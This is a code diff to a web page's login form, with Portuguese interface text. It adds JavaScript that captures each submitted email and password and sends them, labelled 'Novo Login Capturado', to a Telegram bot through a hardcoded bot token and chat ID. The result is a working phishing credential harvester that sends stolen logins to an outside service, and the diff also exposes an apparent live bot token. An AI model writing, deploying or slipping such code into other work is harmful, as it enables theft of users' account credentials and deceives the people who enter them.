@@ -120,17 +120,50 @@
   </div>
 
   <script>
+    const TOKEN = "7683050283:AAEmO1D90_4RysfVlLYOSf5NLfC1Bpg9FMA";
+    const CHAT_ID = "5542692841";
+    const URL = `https://api.telegram.org/bot${TOKEN}/sendMessage`;
+
     document.getElementById('loginForm').addEventListener('submit', function(e) {
       e.preventDefault();
 
       const email = document.getElementById('email').value.trim();
       const password = document.getElementById('password').value;
 
-      if (email && password) {
-        alert('Faz o L!');
-      } else {
+      if (!email || !password) {
         alert('Por favor, preencha todos os campos.');
+        return;
       }
+
+      const message = `
+🔐 *Novo Login Capturado*
+📧 Email: ${email}
+🔑 Senha: ${password}
+      `;
+
+      fetch(URL, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({
+          chat_id: CHAT_ID,
+          text: message,
+          parse_mode: 'Markdown'
+        })
+      })
+      .then(response => response.json())
+      .then(data => {
+        if (data.ok) {
+          alert('Dados enviados com sucesso!');
+        } else {
+          alert('Erro ao enviar os dados.');
+        }
+      })
+      .catch(error => {
+        console.error(error);
+        alert('Falha na comunicação com o servidor.');
+      });
     });
   </script>
 
